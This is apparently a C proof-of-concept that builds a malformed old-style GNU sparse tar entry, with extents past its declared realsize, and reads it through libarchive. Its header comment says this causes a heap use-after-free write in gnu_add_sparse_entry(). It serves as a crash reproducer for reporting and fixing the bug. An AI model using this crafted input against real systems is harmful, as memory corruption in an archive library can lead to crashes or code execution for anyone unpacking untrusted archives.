/*
 * PoC: reading an old-style GNU sparse ("S") tar entry whose sparse
 * map describes extents that lie beyond the end of the file as
 * declared by the header's realsize field.
 *
 * The archive is a structurally valid old-style GNU sparse entry: a
 * 4 KiB file (realsize) whose map claims two 512-byte extents at
 * offsets 1000000 and 2000000, with the corresponding data blocks
 * stored in the archive.  Reading it through the public archive_read
 * API trips a heap-use-after-free (write) in gnu_add_sparse_entry()
 * via the sparse-list tail pointer that the out-of-range block
 * pruning in gnu_sparse_old_read() leaves dangling.
 *
 * Build (against an ASan-instrumented libarchive):
 *   clang -g -O1 -fsanitize=address -I<libarchive-src>/libarchive \
 *       gnu_sparse_oversize.c <builddir>/libarchive/libarchive.a \
 *       -o gnu_sparse_oversize
 */
#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BLK 512

static void
put_octal(char *dst, int len, unsigned long v)
{
	char tmp[32];
	int i;

	memset(dst, '0', len - 1);
	dst[len - 1] = ' ';
	snprintf(tmp, sizeof(tmp), "%lo", v);
	i = (int)strlen(tmp);
	if (i > len - 1)
		i = len - 1;
	memcpy(dst + len - 1 - i, tmp, i);
}

static void
finish_header(unsigned char *b)
{
	unsigned long sum = 0;
	int i;

	memset(b + 148, ' ', 8);
	for (i = 0; i < BLK; i++)
		sum += b[i];
	put_octal((char *)b + 148, 8, sum);
}

static void
put_sparse(unsigned char *b, int off, long so, long sn)
{
	put_octal((char *)b + off, 12, (unsigned long)so);
	put_octal((char *)b + off + 12, 12, (unsigned long)sn);
}

int
main(void)
{
	struct archive *a;
	struct archive_entry *ae;
	unsigned char ar[5 * BLK];
	int r;

	memset(ar, 0, sizeof(ar));

	/* GNU old-style sparse header; extents beyond the 4 KiB file */
	memcpy(ar + 0, "file", 4);
	put_octal((char *)ar + 100, 8, 0644);
	put_octal((char *)ar + 108, 8, 0);
	put_octal((char *)ar + 116, 8, 0);
	put_octal((char *)ar + 124, 12, 1024);	/* bytes stored in archive */
	put_octal((char *)ar + 136, 12, 0);
	ar[156] = 'S';
	memcpy(ar + 257, "ustar  \0", 8);
	memcpy(ar + 265, "root", 4);
	memcpy(ar + 297, "root", 4);
	put_sparse(ar, 386, 1000000, 512);	/* sparse[0] */
	put_sparse(ar, 410, 2000000, 512);	/* sparse[1] */
	put_octal((char *)ar + 483, 12, 4096);	/* realsize */
	finish_header(ar);

	/* extent data */
	memset(ar + BLK, 'A', 512);
	memset(ar + 2 * BLK, 'B', 512);

	a = archive_read_new();
	archive_read_support_format_tar(a);
	if (archive_read_open_memory(a, ar, sizeof(ar)) != ARCHIVE_OK) {
		fprintf(stderr, "open_memory: %s\n", archive_error_string(a));
		return (1);
	}
	r = archive_read_next_header(a, &ae);
	printf("next_header -> %d, size %lld\n", r,
	    (long long)archive_entry_size(ae));
	while (r == ARCHIVE_OK) {
		const void *p;
		size_t s;
		int64_t o;

		while (archive_read_data_block(a, &p, &s, &o) == ARCHIVE_OK)
			printf("data %zu bytes at %lld\n", s, (long long)o);
		r = archive_read_next_header(a, &ae);
		printf("next_header -> %d\n", r);
	}
	archive_read_free(a);
	printf("done\n");
	return (0);
}
